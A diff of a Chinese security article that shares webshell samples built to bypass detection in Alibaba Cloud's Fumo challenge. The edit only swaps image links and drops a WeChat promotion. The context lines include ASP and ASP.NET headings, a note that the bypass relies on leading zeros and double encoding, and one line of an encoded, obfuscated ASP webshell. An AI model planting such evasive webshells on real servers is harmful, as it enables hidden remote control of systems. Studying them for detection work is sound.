@@ -1,7 +1,4 @@
-​                                                   关注微信公众号漫漫安全路，查看更多精彩文章。
-
-![4de798b7ba63fa0fb6a2b7f338bd997](C:\Users\admin\Documents\WeChat Files\wxid_ac8xxqj8y2iv22\FileStorage\Temp\4de798b7ba63fa0fb6a2b7f338bd997.jpg)
-
+![4de798b7ba63fa0fb6a2b7f338bd997](https://github.com/user-attachments/assets/030b190e-d33b-4f50-a19c-6044f41b9cb6)
 阿里云伏魔挑战赛webshell绕过样本分享
 ## ASP
 `asp`样本分享下面两个,绕过思路为前导零、双重编码。
@@ -35,7 +32,8 @@
 +ACM-+AEA-+AH4-+AF4-LwAAAA+AD0-+AD0-+AF0-A/2KxU+-R1W93wmon'+-+ACo-TT8)27CVvD+-+ACQ-+ADs-n/D+AGA-r3rVsnMJb+ACM-wg8AAA+AD0-+AD0-+AF4-+ACM-+AH4-+AEA-
 %>
 ```
-![](https://files.mdnice.com/user/114427/9a3585f4-fc83-46c4-8f2d-0c4a8caede37.png)
+![image](https://github.com/user-attachments/assets/8588ef5e-5882-438f-a364-fca5236c1061)
+
 ## ASP.NET
 `aspx`的样本第三届的时候比较容易绕过，有很多污点源都没打标这类就不写了。主要写两类特殊语法、危险方法替换。
 #### 特殊语法
